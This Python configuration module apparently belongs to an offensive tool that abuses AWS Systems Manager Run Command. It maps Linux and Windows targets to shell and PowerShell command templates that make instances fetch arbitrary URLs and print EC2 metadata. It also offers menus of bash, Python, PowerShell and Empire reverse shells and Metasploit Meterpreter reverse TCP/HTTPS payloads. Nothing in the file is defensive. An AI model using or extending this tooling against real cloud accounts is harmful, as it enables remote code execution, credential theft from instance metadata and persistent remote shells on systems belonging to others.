from typing import NamedTuple, Final

from src.constants import commands
from src.constants.platforms import PlatformTypes


class HandlerConfig(NamedTuple):
    action: str
    attack_url: str
    attack_metadata: str
    reverseshell_options: list[dict]
    metasploit_options: list[dict]


PLATFORM_MAPPING: Final[dict[PlatformTypes, HandlerConfig]] = {
    PlatformTypes.LINUX: HandlerConfig(
        action='AWS-RunShellScript',
        attack_url="python -c \"import requests; print requests.get('%s').text;\"",
        attack_metadata=commands.PRINT_EC2_METADATA_CMD,
        reverseshell_options=[
            {'selector': '1', 'prompt': 'Bash reverse shell', 'return': 'bash'},
            {'selector': '2', 'prompt': 'Python reverse shell', 'return': 'python'},
            {'selector': '3', 'prompt': 'Empire Python Launcher', 'return': 'empirepython'},
        ],
        metasploit_options=[
            {'selector': '1', 'prompt': 'Linux Meterpreter reverse TCP x64',
             'return': 'python/meterpreter/reverse_tcp'},
            {'selector': '2', 'prompt': 'Linux Meterpreter reverse HTTPS x64',
             'return': 'python/meterpreter/reverse_https'},
            {'selector': '3', 'prompt': 'Linux TCP Shell', 'return': 'python/shell_reverse_tcp'},
        ]
    ),
    PlatformTypes.WINDOWS: HandlerConfig(
        action='AWS-RunPowerShellScript',
        attack_url="echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;",
        attack_metadata=commands.PRINT_EC2_METADATA_PSH,
        reverseshell_options=[
            {'selector': '1', 'prompt': 'Powershell reverse shell', 'return': 'powershell'},
            {'selector': '2', 'prompt': 'Empire Powershell Launcher', 'return': 'empirepowershell'},
        ],
        metasploit_options=[
            {'selector': '1', 'prompt': 'Windows Meterpreter reverse TCP x64',
             'return': 'windows/x64/meterpreter/reverse_tcp'},
            {'selector': '2', 'prompt': 'Windows Meterpreter reverse HTTPS x64',
             'return': 'windows/x64/meterpreter/reverse_https'},
            {'selector': '3', 'prompt': 'Windows TCP Shell', 'return': 'windows/x64/shell/reverse_tcp'},
        ]
    ),
}
